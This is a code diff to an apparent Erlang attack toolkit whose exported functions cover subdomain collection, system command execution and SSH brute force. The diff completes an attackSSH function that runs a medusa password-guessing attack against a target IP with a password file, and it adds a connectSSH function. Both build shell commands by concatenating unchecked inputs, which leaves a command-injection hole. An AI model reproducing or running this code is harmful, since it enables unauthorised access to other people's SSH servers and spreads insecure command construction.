@@ -79,6 +79,7 @@
 -export([scanSubdomain/1]).     %% 子域名收集
 -export([exec/1]).              %% 执行系统命令，返回命令输出
 -export([attackSSH/2]).         %% SSH 暴力破解
+-export([connectSSH/2]).       %% SSH 暴力破解
 %%
 -export([start/0]).             %% 检查依赖并启动
 -export([scan/0]).              %% 启动监控脚本
@@ -249,6 +250,12 @@ scanSSH(Url) ->
 attackSSH(IP, USER) ->
     % 连接 SSH 服务器
     SSHCommand = "medusa -h " ++ IP ++ " -u " ++ USER ++ " -P ./passwords.txt -M ssh -t 10",
+    SSHResult = os:cmd(SSHCommand),
+    io:put_chars(SSHResult).
+
+connectSSH(IP, USER) ->
+    % 连接 SSH 服务器
+    SSHCommand = "ssh -p 22 " ++ USER ++ "@" ++ IP,
     SSHResult = os:cmd(SSHCommand),
     io:put_chars(SSHResult).
 
